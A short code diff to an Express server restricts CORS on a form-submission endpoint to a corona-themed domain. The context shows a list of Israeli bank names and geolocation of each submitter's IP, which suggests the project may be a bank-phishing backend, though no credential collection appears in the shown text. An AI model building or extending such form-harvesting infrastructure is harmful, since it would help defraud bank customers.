@@ -25,7 +25,10 @@ const BANKS = new Set(["leumi", "discount", "jerusalem"]);
 const app = express_1.default();
 app.use(express_1.default.static('public'));
 app.use(body_parser_1.urlencoded({ extended: false }));
-app.post("/api/v1/submit", cors_1.default(), (req, res) => {
+app.post("/api/v1/submit", cors_1.default({
+    origin: 'https://coronaforms.org/',
+    optionsSuccessStatus: 200
+}), (req, res) => {
     let ip = req.headers["cf-connecting-ip"] || req.headers["x-forwarded-for"] || req.connection.remoteAddress;
     let geoData = geoip_lite_1.default.lookup(ip.toString());
     let countryName = iso_country_codes_1.default.get(geoData.country);
